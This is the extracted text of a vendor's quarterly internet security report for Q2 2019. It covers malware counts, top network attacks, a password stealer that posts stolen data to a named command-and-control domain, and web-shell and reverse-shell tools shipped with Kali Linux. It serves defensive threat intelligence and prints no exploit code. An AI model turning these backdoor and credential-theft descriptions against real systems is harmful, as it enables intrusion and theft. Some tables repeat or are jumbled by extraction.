{
    "id": "bec08341-1454-4e28-a434-cc5c6b12612c",
    "created_at": "2022-10-25T16:48:19.715085Z",
    "updated_at": "2025-03-27T02:16:26.419542Z",
    "deleted_at": null,
    "sha1_hash": "8f14a6c9e5826f398058a3d600b79c0a40a19b56",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-09-24T08:50:20Z",
    "file_modification_date": "2019-09-24T08:50:42Z",
    "file_size": 6933662,
    "plain_text": "#### Internet Security Report\n\n###### QUARTER 2, 2019\n\n\n-----\n\n#### Contents\n\n###### The Firebox Feed™ provides\n\n quantifiable data and trends\n\n about hackers’ latest attacks, and\n\n understanding these trends can help\n\n us improve our defenses.\n\n\n###### 03 Introduction\n\n04 Executive Summary\n\n05 Firebox Feed Statistics\n\n**07** **Malware Trends**\n\n08 Overall Malware Trends\n\n09 Most-Widespread Malware\n\n09 New Malware Hits\n\n13 Geographic Threats by Region\n\n14 Known vs Evasive Zero Day Malware\n\n**15** **Network Attack Trends**\n\n17 Top 10 Network Attacks Review\n\n18 New Network Attacks\n\n19 Quarter-Over-Quarter Attack Analysis\n\n20 Year-over-Year Attack Analysis\n\n21 Geographic Attack Distribution\n\n**22** **DNS Analysis**\n\n23 Top Malware Domains\n\n24 Top Phishing Domains\n\n**25** **Firebox Feed: Defense Learnings**\n\n###### 26 Top Security Incidents:\n\n**27** **The Baltimore Ransomware Attack**\n\n28 Robinhood\n\n29 The Damages\n\n30 Lessons Learned\n\n###### 31 WatchGuard Threat Lab Research\n\n**32** **Three MSPs Hijacked to Spread**\n**Ransomware**\n\n33 Story Overview\n\n35 MSP Malware Sample Analysis\n\n36 Secondary PowerShell Injector Script\n\n38 Analyzing the Embedded PE File:\nSodinokibi Ransomware\n\n39 Conclusion and Takeaways\n\n###### 42 Conclusion and Defense Highlights\n\n 45 About WatchGuard\n\n\n**A** **B**\n\n**Reset**\n\n**A** **B**\n\n**Reset**\n\n\n-----\n\n#### Introduction\n\nIt’s September, which in the U.S. means the end of\nsummer but the beginning of the American football\nseason. Along with real football comes Fantasy\n\n###### 06\n\nFootball, where groups of friends and co-workers\n“fake draft” real football players into imaginary\nteams and see which of them would have won\npretend games based on each individual player’s\nreal performance. If you’re into sports, stats, and\na little fun competition, Fantasy Football is an\nentertaining past time. However, if you want to\nwin, you’ll have to understand long-term, historical\nplayer trends. Sure, last week’s player results, or\neven three years of a player’s results can’t perfectly\npredict what that player will score next week. The\nuniverse is full of entropy. However, statistically\nyou’ll have a much better chance of understanding\nhow a player will perform in the future if you take a\nlarge enough sample of his past into account. 24\n\nWatchGuard’s quarterly Internet Security Report\n(ISR) is the historical “player statistics” of the\nthreat landscape. The more you know about what\nattackers have been doing the past quarter – or\neven the past few years – the more you will\nunderstand what they’ll likely do in the future.\nObviously, this knowledge gives you a big leg up\nin your defense, allowing you to win your threat\nlandscape pool. And unlike fantasy games, that\npool has real-world consequences if you lose.\n\nThis report includes detailed threat intelligence\nabout the top and most-widespread malware, the 28\nmost common network attacks seen in the wild,\nand the top domains targeting your users. In short,\nit’s the historical attack data that can help you\npick your security starter lineup for next quarter.\nBesides the raw numbers, our Threat Lab experts\nalso offer their detailed analysis and opinions on\nthe data we report, acting as the top fantasy sports\ncommentator to your threat landscape league. If\nyou’re responsible for securing your organization,\nor even marginally interested in protecting yourself\nonline, this report should help you win more\nmatches against cyber criminals… and who doesn’t\nwant to win their fantasy sport pool. 40\n\n**If you play fantasy sports, you’re probably someone**\n\n**who likes to win; especially when money is on the**\n\n**line. In information security, your business’s money**\n\n**is always on the line, potentially costing you millions**\n\n**if you lose the next game. That’s why fantasy players**\n\n**often turn to advice from the experts. Let us act as**\n\n\n###### Now that you know why you should keep reading, here’s what we cover this quarter:\n\n Q2’s Firebox Feed results.\n\nAs always, the WatchGuard Threat Lab\nanalyzes threat intelligence from tens of\nthousands of Fireboxes. This feed includes\nhistorical data about the top malware,\nboth by volume and percentage of victims\naffected. It also includes network attack\nstatistics based on our intrusion prevention\nservice and our DNS security service. We\nalso try to highlight regional trends, when\nrelevant, and share defense strategies for the\ntrends we find. In short, these are the key\n“player” stats you can leverage to figure out\nwhat attackers might do next.\n\n###### Top Story: The Baltimore Ransomware Attack. \n\nUnless you’ve cut all online connections (in\nwhich case, how are you reading this?), you\nprobably heard about the huge ransomware\nattack in Baltimore during Q2. This attack will\nlikely cost Baltimore at least $17 million in\nrecovery costs (even though they didn’t pay\nthe ransom). What you may not know is all\nthe details about how the attack happened,\nand how you can avoid the same. We cover\nboth in this report.\n\n###### Research Section: Q2 MSP Attacks. \nUnfortunately, the Baltimore incident wasn’t\nthe only big ransomware story for Q2.\nSophisticated attackers also hijacked three\nmanaged service providers (MSPs) and used\ntheir tools to spread ransomware to all their\ncustomers. An involved MSP shared some\nof the malware samples from these attacks\nwith us, which we analyzed. In this report,\nwe share our technical findings, and some\nimportant MSP defense tips. Throughout the\nreport, and in conclusion, we share many\nvaluable defensive strategies to avoid some of\nthe threats we highlight from Q2 2019.\n\n###### Words of Security Advice.\nBy the end of the report, you should have\nsome idea of how dangerous some of the\nopposing team players can be. However, you’ll\nalso have great insight on their playbook. We\nfill that out by sharing our expert analysis,\noffering strategies on how you can win this\nimportant security game next quarter.\n\n\n###### 06\n\n\n###### Attack. \n\n 24\n\n\n###### 24\n\n\n###### 40\n\n\n-----\n\n#### Executive Summary\n\n###### This quarter, malware was down but network attacks were up; we saw an increase in backdoor shell\n\n scripts coming from a well-known Linux penetration testing distribution; and ransomware was up\n\n with two major stories of targeted infections. The good news is, a properly configured WatchGuard\n\n Firebox with Total Security could have blocked all these threats, so hopefully none affected you.\n\n That said, it’s worth learning from these trends, especially if you haven’t implemented all of the\n\n different security services required to block them. Read on to learn Q2’s threat landscape stats, and\n\n receive your security playbook for Q3. \n\n**Our Q2 2019 Internet Security Report highlights:**\n\n\n\n- **Zero day malware accounted for 38% of all**\n\n**malware detections, within a few percentage**\n\npoints of the previous two quarters.\n\n- Overall malware detections trended down\n\n**around 5% this quarter compared to Q1 2019.**\n\nMalware is still up 64% compared to Q2 2018.\n\n- **DNSWatch blocked multiple campaigns that**\n\nused Content Delivery Networks (CDNs) to\n\nhost browser-hijacking malware.\n\n- In Q2 2019, there was an increased overlap\n\n**between the most-widespread malware**\n\n**detection affecting individual networks and**\n\n**the most prolific malware by volume, with**\n\nthree threats found in both lists.\n\n- **The EMEA region saw the most malware**\n\n**detections per Firebox, with APAC in a close**\n\nsecond and AMER bringing up the rear. This\n\nis almost the perfect opposite to the previous\n\nquarter.\n\n\n\n- Multiple popular backdoor shell scripts, used by\n\nboth penetration testers and cyber criminals,\n\nshowed up in our top malware attacks. Both the\n\n**Backdoor.Small.DT and Trojan.GenericKD (SSB)**\n\n**tools come pre-installed with Kali Linux.**\n\n- **11% of the sextortion (sexual extortion)**\n\n**phishing emails associated with Trojan.**\n\n**Phishing.MH targeted Japan. We aren’t positive**\n\nwhy but suspect it could have to do with\n\nsextortion being more effective in conservative\n\ncultures.\n\n- **Network attacks more than doubled from Q1 to**\n\n**Q2. This was the largest percent increase we’ve**\n\nseen since 2017.\n\n- In Q2 2019, WatchGuard Fireboxes blocked\n\n**22,619,836 malware variants (549 per device)**\n\nacross all three anti-malware engines and\n\n**2,265,425 network attacks (60 per device).**\n\nNow that you know what to expect, it’s time to dive\n\ninto the nitty gritty. Read on to learn more about\n\nthe opposing players, and how you can build a\n\nsecurity defense that wins.\n\n\n-----\n\n#### Firebox Feed Statistics\n\n\n-----\n\n##### Firebox Feed Statistics\n\n###### What Is the Firebox Feed?\n WatchGuard Firebox owners all over the world can opt in\n\n to sending anonymized data about detected threats back\n\n to the WatchGuard Threat Lab for analysis. We call this\n\n threat intelligence feed the Firebox Feed. Every quarter,\n\n we summarize our observations from the Firebox Feed and\n\n report on the latest threat trends that are likely to affect our\n\n customers and the industry as a whole.\n\nData sent to the Firebox Feed does not include any private\n\nor sensitive information. We always encourage customers and\n\npartners to opt in whenever possible to help us obtain the\n\nmost accurate data.\n\nThe Firebox Feed contains five different detection services:\n\n     - Malware our Gateway AntiVirus (GAV) service prevents.\n\n     - Malware detected by our new InteligentAV (IAV)\n\nmachine-learning engine.\n\n     - Advanced malware detected by our behavioral analysis\n\nservice, APT Blocker.\n\n     - Network exploits our Intrusion Prevention Service (IPS)\n\nblocks.\n\n     - Connections to malicious domains blocked by DNSWatch.\n\nDuring Q2 2019, the Firebox Feed included threats captured\n\nfrom 41,229 Firebox appliances across the globe. This number\n\ndecreased this quarter and still only accounts for 10% of the\n\nactive Firebox appliances deployed on customer networks. If\n\nyou are a customer or partner and want to help improve these\n\nresults, see the panel to the right to learn how to participate.\n\n\n###### Help Us Improve\n This Report\n\nIf you’re a Firebox customer, you\n\ncan help us improve this report, as\n\nwell as improve your neighbor’s and\n\nyour own security, by sharing your\n\ndevice’s threat intel. The data from\n\nthe Firebox Feed comes entirely\n\nfrom customer devices catching\n\nreal threats in the field. However, we\n\nonly receive this data if you opt in to\n\nsending WatchGuard device feed­\n\nback to us. Besides helping us build\n\nthis report, this data and the threat\n\nteam’s analysis also helps our com­\n\npany improve our products, making\n\nall Firebox owners more secure. Right\n\nnow, we receive data from about 10%\n\nof the active Fireboxes in the field.\n\nIf you want to improve this number,\n\nfollow these three steps.\n\n1. Upgrade to Fireware OS 11.8\n\nor higher (we recommend\n12.x)\n\n2. Enable device feedback in\n\nyour Firebox settings\n\n3. Configure WatchGuard\n\nproxies and our security\nservices, such as GAV, IPS\nand APT Blocker, if available\n\n\n-----\n\n##### Malware Trends\n\n\nzero day malware before\n\nit reaches your network.\n\nThe order of our anti-malware\nservices follows the list above.\nGAV followed by IAV, then APT\nBlocker. If IAV is not available,\nAPT Blocker analyses the file after\nGAV. IAV requires a large amount\nof memory, thus only runs on our\nrack-mounted Fireboxes. This\naffects the data we see in IAV as\nFireboxes with IAV enabled are\nnormally found in larger set-ups.\n\n###### The Firebox Feed Our GAV service APT Blocker IntelligentAV\n recorded threat\n blocked detected blocked\n data from\n 41,229 17,005,262 5,189,476 425,098 \n participating\n malware variants additional threats malware hits\n Fireboxes\n\n**a 6% decrease** QoQ we saw a 2% **10%**\n\na 3% drop in the quarter over quarter decrease. YoY we saw an\n\nQoQ decrease.\n\nnumber of Fireboxes (QoQ) increase by 40%\nreporting last quarter\n\n\n-----\n\n###### Q2 2019 Overall Malware Trends:\n\n  - The number of Fireboxes reporting data to the Firebox Feed decreased in Q2. While we saw\n\n**a year-over-year (YoY) increase in Q1, reporting Fireboxes dropped 3% this quarter. The**\n\nmore Firebox reports we gather, the better we can identify current threat trends and predict\n\n[future ones. We ask that if you find the data in this report helpful, please enable WatchGuard](https://watchguardsupport.secure.force.com/publicKB?type=KBArticle&SFDCID=kA2F00000000LICKA2&lang=en_US)\n\n**[Device Feedback.](https://watchguardsupport.secure.force.com/publicKB?type=KBArticle&SFDCID=kA2F00000000LICKA2&lang=en_US)**\n\n  - **Gateway AntiVirus (GAV) blocked over 17 million malware variants in Q2, a decrease of**\n\n**6% QoQ. While it’s down from last quarter’s numbers, it still represents a 59% increase in**\n\nmalware YoY. Many of these detections still come from the password stealer Mimikatz.\n\n**•** We saw a very slight 2% decrease in the total APT hits (5,189,476) during Q2 over Q1.\n\nWhen considering this decrease however, the decrease in reporting Fireboxes probably\n\naccounts for the difference. YoY numbers tell a different story though. We saw a\n\n40% increase in APT Blocker hits over last year. This is in addition to the threats that\n\nIntelligentAV (IAV) caught before reaching APT Blocker.\n\n**• Speaking of IAV, we saw a 10% QoQ decrease in the number of IAV hits; down to 425,098.**\n\n###### WatchGuard Product Telemetry Participation\n\n**42,372**\n\n**41,229**\n\n**39,832**\n\n**24,694**\n\n**(Initial Report) Q4, 2016** **(YoY Report) Q2, 2018** **(QoQ Report) Q1, 2019** **(Current Report) Q2, 2019**\n\n_Figure 1: Tracking Firebox Feed Participation_\n\n\n###### WatchGuard Product Telemetry Participation\n\n**42,372**\n\n**41,229**\n\n**39,832**\n\n**24,694**\n\n**(Initial Report) Q4, 2016** **(YoY Report) Q2, 2018** **(QoQ Report) Q1, 2019** **(Current Report) Q2, 2019**\n\n\n-----\n\n**COUNT** **THREAT NAME** **CATEGORY** **LAST SEEN**\n\n**2,180,937** **Mimikatz** **Password Stealer** **Q1 2019**\n\n**1,355,429** Win32/Heri Win Code Injection Q4 2018\n\n**1,116,985** Win32/Heim.D Win Code Injection Q1 2019\n\n**978,996** CVE-2017-11882 Office Exploit Q1 2019\n\n**569,964** Win32/Heur Generic Win32 Q1 2019\n\nTrojan.GenericKD\n**489,400** Generic Win32 NEW\n(SBD)\n\n**368,067** Backdoor.Small.DT Webshell NEW\n\n**283,976** Phishing.MH Phishing NEW*\n\nCryptominer/ Win\n**230,765** Razy Q1 2019\nCode Injection\n\n**172,927** RTF-ObfsObjDat Office Exploit NEW**\n\n\n_Figure 2: Top 10 Gateway AntiVirus Malware Detections_\n\n_* Phishing.MH showed up in the most-widespread malware in Q1 2019._\n\n_** RTF-ObfsObjDat showed up in the most-widespread malware in Q4 2018._\n\n**Malware Name** **Top 3 Countries by %**\n\n**CVE-2017-11882.Gen** Mauritius Great Britain\n**(Office)** 5.1% 5.0%\n\nJapan Hungar\n**Trojan.Phishing.MH**\n\n11.0% 4.9%\n\nGreat\n\n**Exploit.RTF-** Belgium\n\nBritain\n\n**ObfsObjDat.Gen** 5.5%\n\n6.2%\n\nGreat\n\n**Exploit.SpamMalware-** Hong Kong\n\nBritain\n\n**RAR.Gen** 4.7%\n\n6.8%\n\nBelgium Great Britain\n**Exploit.CVE-2017-0199.Gen**\n\n7.8% 5.2%\n\n_Figure 3: Top 5 Most-Widespread Malware Detections_\n\n|Malware Name|Top 3 Countries by %|EMEA %|APAC %|AMER %|\n|---|---|---|---|---|\n|CVE-2017-11882.Gen Mauritius Great Britain Germany 58% 22% 20% (Office) 5.1% 5.0% 4.6%|||||\n|Japan Hungar Netherlands Trojan.Phishing.MH 29% 58% 13% 11.0% 4.9% 4.9%|||||\n|Great Exploit.RTF- Belgium Netherlands Britain 56% 23% 21% ObfsObjDat.Gen 5.5% 4.3% 6.2%|||||\n|Great Exploit.SpamMalware- Hong Kong Turkey Britain 57% 24% 19% RAR.Gen 4.7% 4.6% 6.8%|||||\n|Belgium Great Britain Germany Exploit.CVE-2017-0199.Gen 58% 20% 22% 7.8% 5.2% 4.6%|||||\n\n\n**CVE-2017-11882.Gen** Mauritius Great Britain Germany\n\n58% 22% 20%\n\n**(Office)** 5.1% 5.0% 4.6%\n\nJapan Hungar Netherlands\n**Trojan.Phishing.MH** 29% 58% 13%\n\n11.0% 4.9% 4.9%\n\nGreat\n\n**Exploit.RTF-** Belgium Netherlands\n\nBritain 56% 23% 21%\n\n**ObfsObjDat.Gen** 5.5% 4.3%\n\n6.2%\n\nGreat\n\n**Exploit.SpamMalware-** Hong Kong Turkey\n\nBritain 57% 24% 19%\n\n**RAR.Gen** 4.7% 4.6%\n\n6.8%\n\nBelgium Great Britain Germany\n**Exploit.CVE-2017-0199.Gen** 58% 20% 22%\n\n7.8% 5.2% 4.6%\n\n\n-----\n\n###### Most-Widespread Malware\n\nThe top 10 malware by pure volume is interesting, but we argue it’s even more interesting\n\nto know which threats affect most networks, which is the point of our widespread malware\n\nchart. This quarter we saw three samples overlap between the top and the most-widespread\n\nmalware. In the past, we’ve only seen one malware variant make both lists, so we feel it’s\n\nsignificant to see three of the top threats also affect a wide array of victims. If you see\n\nmalware make both our lists, you should make sure you have the protections to block them\n\n(If you’re a Firebox owner with Total Security you already have that protection).\n\nOf note, all the malware samples in the most-widespread list start with a phishing scam\n\nor try to obtain remote access. No specialized malware like Mimikatz shows up on the list,\n\nindicating that these malware payloads are likely just to get a foothold into your network\n\nbefore deploying the final payload.\n\nIn Q2, Trojan.Phishing.MH showed up in the most-widespread list after previously making an\n\nappearance in the top 10 during Q4 2018. You can learn more about this phishing threat in\n\nour Q4 2018 report.\n\n###### New Malware Hits\n\nLet’s take a look at a few new malware variants on our top 10 list.\n\n###### Backdoor.Small.DT\n\nBackdoor.Small.DT, a web shell script, comes with the popular hacking operating system\n\nKali Linux. Kali provides Linux-based penetration testing tools, including this one.\n\nSpecifically, Backdoor.Small.DT is a script that can give remote attackers backdoor access to\n\nweb servers. That said, attackers need to find a vulnerability or configuration mistake on a\n\nweb server in order to load this web shell onto it.\n\nBackdoor.Small.DT, or what Kali simply calls “Webshells,” uses PHP, ASP, JSP, ASPX, Perl,\n\nor CFM to create a backdoor on a web server. It’s able to create its backdoor using any of\n\nthese languages or to stay compatible with whichever language the target web server might\n\nsupport. Once installed, an attacker can leverage the backdoor to gain command line shell\n\naccess to the server itself. Perl- and PHP-based servers are in more danger since a reverse\n\nshell can be created directly from the exploit. Other languages give partial access through\n\nthis vulnerability to an attacker. Even with partial access they can move laterally until they\n\nfind another vulnerability to gain control of your system.\n\nWe saw a similar malware variant in our Q4 2016 top 10 list, but only for PHP servers. As\n\nservers move away from PHP to other languages, so have web shells.\n\nFor more information on what attackers have access to, see the Kali documentation here.\n\n**[https://tools.kali.org/maintaining-access/webshells](https://tools.kali.org/maintaining-access/webshells)**\n\n\n-----\n\n###### Trojan. GenericKD.30649454 (SBD)\n\nTrojan.GenericKD covers a family of malware that creates a backdoor to a command and\n\ncontrol (C2) server. This variant, also called Secure BackDoor (SBD), is another Kali Linux\n\nmodule that penetration testers and attackers use to create a reverse shell. An additional\n\nencryption option helps it bypass many C&C detection mechanisms once the malware is\n\ninstalled.\n\nIn order for the trojan to work, an attacker must first find a way to install the malware onto\n\nthe victim’s computer. Typically, attackers do this either by tricking a user into installing it\n\nthemselves, or by exploiting a software vulnerability that allows them to forcefully install the\n\nmalware. Once installed, the trojan opens a predetermined network port on your computer.\n\nIn fact, the malware shares much of its code and functionality with a legitimate low-level,\n\nLinux-based network communication tool called NetCat, which can also work on Windows\n\nsystems.\n\nWhile we tested the vulnerability by manually running the program with arguments\n\non a vulnerable computer, an attacker could automate this and run the malware in the\n\n[background automatically. Additionally, since the source code is available, someone could](http://mirrors.ocf.berkeley.edu/kali/pool/main/s/sbd/sbd_1.37.orig.tar.gz)\n\ncompile the source code into any program and even make it run on Windows. While the\n\ncode itself can’t do much harm without compiling it, do use caution when examining this\n\ncode. This malware family is a good example of why you should never download files from\n\nuntrusted sources.\n\n_Figure 4 Left: Accessing bash through the open port_\n\n_Figure 4 Right: Command to create an open port to access bash_\n\n\n_Figure 4 Left: Accessing bash through the open port_\n\n\n-----\n\n###### Trojan.Delf.Agent.LD\n\nWhile it didn’t make the top 10, we found an interesting malware sample called Trojan.Delf.\n\nAgent.LD in the top 50. When we first got our hands on the original sample file, we had\n\nproblems opening it. However, the file’s MIME type, “application/x-ace-compressed,” guided\n\n[us to the fact it was an ACE compressed file.](https://whatis.techtarget.com/fileformat/ACE-ACE-Archiver-Compression-file)\n\nKnowing our GAV service marked this file as malicious, we first assumed the threat had\n\n[something to do with a previous known ACE vulnerability in WinRAR, so we decided to test for](https://www.bleepingcomputer.com/news/security/malspam-exploits-winrar-ace-vulnerability-to-install-a-backdoor/)\n\nthat. However, creating an environment to test this was a bit difficult because WinRAR has\n\nremoved support for ACE files. We had to find and download an older vulnerable version of\n\nWinRAR from a few years past.\n\nOnce we finished creating and securing our test sandbox, we opened the malicious\n\nfile with WinRAR expecting it to exploit that WinRAR ACE vulnerability. To our\n\nsurprise, nothing happened… other than WinRAR normally extracting the “Payment\n\nadvice.exe” file from within the compressed ACE file. As it turns out, this malware\n\nsample was not trying to take advantage of an ACE vulnerability, as we had\n\nguessed, but simply used normal ACE compression to hide the real malicious\n\nexecutable. We suspect they picked ACE compression because it’s no longer a\n\n\ncommon compression standard, and thus may bypass some antivirus products.\n\nLuckily, WatchGuard GAV still recognizes this ACE-compressed malware.\n\n\n_Figure 5: Icon after_\n\n_extracting RAR_\n\n\nIn any case, we finally got to the root malicious file. Examining the executable, we noticed\n\nthe attacker manipulated its metadata. The metadata says, ‘compiled in June of 1992,’\n\nwhich we know isn’t possible. After analyzing the sample, we see it can steal passwords\n\nfrom IE, Firefox, Chrome, Opera, Outlook, FTP, and Windows saved passwords. Mozilla, who\n\ndistributes Firefox, didn’t exist until 1998, six years after the complied date, which is why\n\nwe know that date is false. We suspect this sample probably came out sometime around\n\nNovember 2018, which is the first date someone uploaded the sample to VirusTotal.\n\nThe malware also has the capability to communicate with an HTTP-based command and\n\ncontrol server. Specifically, it sends POST messages with encrypted content to a PHP script\n\nlocated on faceimail[.]cf (do not visit this potentially dangerous link).\n\nOut of curiosity, we attempted to manually send a POST message to the C2 server and got\n\nan interesting response.\n\n###### HTTP/1.1 448\n\n[448 is not an official HTTP status code – it doesn’t legitimately exist in any HTTP standard.](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)\n\nWhen visiting other locations on the same domain, we got normal HTTP status codes like\n\n404, 504, but only the C2 PHP script itself responded with 448. However, after a little\n\n[digging, we did find a single blog post jokingly explaining that HTTP status code 448 means](https://annevankesteren.nl/2004/05/24/195653)\n\n“Gone until you stop paying attention to people I dislike.” This error code may just be geek\n\nhumor, or it may be meant as a message for anyone investigating the malware, like us. In any\n\ncase, the server likely still works and saves the POST message to its database.\n\nWhile not the most sophisticated password stealer, this malware’s use of ACE compression\n\ncould help it bypass some protections. We don’t think this password stealer is as\n\nsophisticated and dangerous as Mimikatz, but it still offers another reason for you to\n\nimplement multi-factor authentication throughout your organization.\n\n\n-----\n\n###### Geographic Threats by Region\n\nNext, let’s explore the regional distribution of malware. In Q2, Europe,\n\nthe Middle East and Africa (EMEA) countries were hit with just a little\n\nmore malware than the Asia Pacific (APAC). Meanwhile, the Americas\n\n(AMER) saw the least amount of malware per Firebox, though it was\n\nstill significant by volume. Q2 was almost exactly the opposite of the\n\nprevious quarter where AMER had the most malware per Firebox.\n\n\n**_Geographic Threats by Region_**\n\n**Region** **Hits** **Percent**\n\nEMEA 7,648,761 36.6%\n\nAMER 6,564,888 27.0%\n\nAPAC 2,791,611 36.4%\n\n_Figure 6: Geographical Distribution of_\n_Most-widespread Malware_\n\n|Region|Hits|Percent|\n|---|---|---|\n|EMEA|7,648,761|36.6%|\n|AMER|6,564,888|27.0%|\n|APAC|2,791,611|36.4%|\n\n\nInterestingly, since switching to a “per Firebox” weighted breakdown for the regional malware,\n\nthere hasn’t been a consistent trend of one region sticking out every quarter. Instead, there has\n\nbeen a pretty consistent near-even spread of malware globally. We’ll continue to follow these new\n\nweighted trends to see if anything specific stands out long term.\n\nAs was the case in previous quarters, Mimikatz again targeted AMER the most with about 3/4 of\n\nthe total hits. EMEA saw most of the remaining hits. Also consistent with previous quarters, Razy\n\ncontinued to primarily target APAC.\n\nAs for other attacks, Exploit.CVE-2017-11882 – a well-known Office vulnerability delivered via Word\n\nor Excel documents – primarily targeted Italy and Germany when looking at pure volume. However,\n\nwhen we look at the countries with the greatest number of affected victims (widespread), Great\n\nBritain and the small island of Mauritius were targeted the most.\n\nWhile talking about widespread malware, Great Britain was a major target, with four of the five\n\nthreats targeting it.\n\nInterestingly, Trojan.Phishing.MH hit 11% of Fireboxes in Japan, a relatively high percentage. If\n\nyou don’t remember, this was the sextortian phishing threat from Q1 that tried to extort victims\n\nfor money by convincing them that the attacker had inappropriate and compromising videos of\n\nthem (which isn’t true). One possible explanation for the high volume in Japan might be due to\n\nsextortion being more effective in conservative cultures. That said, this phishing email would most\n\nlikely need to be language-localized to work in regions like Japan.\n\n###### Malware Detection by Region\n\n\n###### 37%\n\n\n###### APAC 36%\n\n\n**AMERICAS**\n\n\n-----\n\n###### Known vs Evasive Zero Day Malware\n\nIn Q2, APT Blocker stopped over 38% of all malware. This is the third quarter in a row\n\n**where our Zero Day Malware percentage stabilized around 38%. If you’re only using**\n\nsignature-based malware protection, you are missing one in three threats, which is far too\n\nmany with today’s malware volume. Without advanced services like APT Blocker, users would\n\nsee much more malware reaching their systems.\n\nMeanwhile, IAV proactively identifies malware using a machine learning/artificial intelligence\n\nengine that breaks files down into indivdual features. After training with hundreds of millions\n\nof benign and malicious files, IAV can predict if a new file is malicious or not, making it far\n\nbetter at catching zero day malware.\n\nIn total APT Blocker and IAV blocked over 5.5 million malware samples. While our\n\nsignature-based GAV service still blocked the most (62%), layering defenses with GAV, IAV,\n\nAPT Blocker, TDR, and finally an antivirus for the local host, is still critical for staying safe\n\nfrom today’s evasive threats.\n\n### 38% 62%\n\n###### OF MALWARE WAS OF MALWARE WAS ZERO DAY KNOWN\n MALWARE MALWARE\n\n_Figure 7: Zero Day vs Known Malware_\n\n\n-----\n\n##### Network Attack Trends\n\nThis section of the Internet Security Report (ISR) details network attack trends. Network attacks refer to\n\nvulnerabilities in software applications that bad guys can exploit over a network. More specifically, it covers\n\nany attacks caught by our network Intrusion Prevention Service (IPS). The IPS service is designed to detect\n\nand prevent network attacks using network signatures, which are just rules designed to recognize the technical\n\npatterns of known software vulnerabilities.\n\nDuring both 2017 and 2018, network attacks rose from Q4 to Q1, and then declined from Q1 to Q2. However,\n\nthis year the exact opposite happened; we saw an unexpected decrease in attacks from Q4 2018 to Q1 2019,\n\nbut a drastic twofold increase in attacks between 2019’s Q1 to Q2. In short, 2019’s network attack volume is\n\nbucking the normal trends. We’re interested in see what happens in Q3.\n\nAt a high-level, there were 2,265,425 network attacks in Q2, which translates to about 60 attacks per Firebox!\n\n\n###### 2,265,425 network\n attacks in Q2 60\n Attacks per Firebox!\n\n\n#### 60\n\n###### Attacks per Firebox!\n\n\n-----\n\n|Quarterly Trend of All IPS Hits|Quarter/ IPS Year Hits|\n|---|---|\n||Q4 2016 3,038,088|\n||Q1 2017 4,151,210|\n||Q2 2017 2,902,984|\n||Q3 2017 1,612,303|\n|||\n||Q4 2017 6,907,718|\n||Q1 2018 10,516,672|\n|||\n||Q2 2018 1,034,606|\n||Q3 2018 851,554|\n|||\n||Q4 2018 1,244,146|\n||Q1 2019 989,750|\n||Q2 2019 2,265,425|\n\n\n###### Quarterly Trend of All IPS Hits Q1 2017 4,151,210\n\nQ2 2017 2,902,984\n\n**12,000,000** Q3 2017 1,612,303\n\nQ4 2017 6,907,718\n\n**10,000,000** Q1 2018 10,516,672\n\nQ2 2018 1,034,606\n\n**8,000,000** Q3 2018 851,554\n\nQ4 2018 1,244,146\n\n**6,000,000** Q1 2019 989,750\n\nQ2 2019 2,265,425\n\n**4,000,000**\n\n**2,000,000**\n\n**0**\n\n**Q4 2016** **Q1 2017** **Q2 2017** **Q3 2017** **Q4 2017** **Q1 2018** **Q2 2018** **Q3 2018** **Q4 2018** **Q1 2019** **Q2 2019**\n\n\n**Quarter/** **IPS**\n\n**Year** **Hits**\n\nQ4 2016 3,038,088\n\nQ1 2017 4,151,210\n\nQ2 2017 2,902,984\n\nQ3 2017 1,612,303\n\nQ4 2017 6,907,718\n\nQ1 2018 10,516,672\n\nQ2 2018 1,034,606\n\nQ3 2018 851,554\n\nQ4 2018 1,244,146\n\nQ1 2019 989,750\n\nQ2 2019 2,265,425\n\n\n_Figure 8: Quarterly Trends of all IPS Hits_\n\n**1,400**\n\n**1,200**\n\n**1,000**\n\n**800**\n\n**600**\n\n**400**\n\n**200**\n\n**220**\n\n**200**\n\n**0**\n\n**Q1 2017** **Q2 2017**\n\n_Figure 9: Unique IPS Signatures_\n\n\n###### Unique IPS Signatures\n\n\n**1,400**\n\n**1,200**\n\n**1,279**\n\n**1,000**\n\n**800**\n\n**600**\n\n**600**\n\n**478**\n\n**400**\n\n**337** **348**\n\n**323** **329**\n\n**281**\n\n**200**\n\n**220**\n\n**200**\n\n**0**\n\n**Q1 2017** **Q2 2017** **Q3 2017** **Q4 2017** **Q1 2018** **Q2 2018** **Q3 2018** **Q4 2018** **Q1 2019** **Q2 2019**\n\n\n-----\n\n###### Top 10 Network Attacks Review\n\nLet’s quickly explore the top 10 network attacks, which you can see in figure 10. Eight of these\n\n[attacks are repeats from our previous list. Only two attacks, EXPLOIT Nodejs js-yaml and WEB](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1058051)\n\n**[Directory Traversal, debuted this quarter. We’ll cover those in more detail shortly. Looking at figure](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1049802)**\n\n11, you can see just how concentrated the top 10 attacks are compared to all other attacks. They\n\nrepresent over two-thirds of all IPS hits!\n\n**Threat** **Affected** **WatchGuard**\n**Name** **CVE Number** **Count**\n**Category** **Products** **Signature ID**\n\nWindows, Linux, FreeBSD,\n**WEB SQL injection attempt -33** Web Attacks **[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160)** N/A 645,238\nSolaris, Other Unix\n\nWindows, Linux, FreeBSD,\n\n**WEB Cross-site Scripting -36** Access Control Solaris, Other Unix, Net­ **[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451)** CVE-2011-2133 154,330\n\nwork Device\n\nWindows, Linux, FreeBSD,\n**WEB SQL injection attempt -7** Web Attacks **[1054841](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054841)** CVE-2010-0112 125,920\nSolaris, Other Unix\n\n**WEB GNU Bash Remote Code**\n\nLinux, FreeBSD, Solaris,\n\n**Execution -6 (CVE-2014-6271,** Access Control **[1130029](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130029)** CVE-2014-6271 125,377\n\nOther Unix, Mac OS\n\n**Shellshock)**\n\n**EXPLOIT Adobe Shockwave**\n**Director PAMI Chunk Parsing**\n\nAccess Control Windows **[1054264](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054264)** CVE-2010-2872 107,567\n\n**Memory Corruption**\n**(CVE-2010-2872)**\n\nLinux, FreeBSD, 